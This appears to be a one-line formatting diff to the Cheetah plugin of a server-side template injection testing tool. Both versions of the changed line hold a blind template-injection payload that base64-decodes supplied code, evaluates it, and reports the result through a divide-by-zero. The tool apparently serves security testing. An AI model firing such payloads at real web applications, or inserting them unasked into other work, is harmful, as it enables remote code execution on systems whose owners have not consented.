@@ -41,7 +41,7 @@ class Cheetah(python.Python):
             },
             'evaluate_boolean': {
                 'call': 'inject',
-                'evaluate_blind': """${{getVar('a', '').replace($getVar('a', ''), '')}}${{str(1 / bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode())))}}"""
+                'evaluate_blind': """${{getVar('a', '').replace($getVar('a', ''), '')}}${{str(1/bool(eval(__import__('base64').urlsafe_b64decode('{code_b64}').decode())))}}"""
             },
         })
 
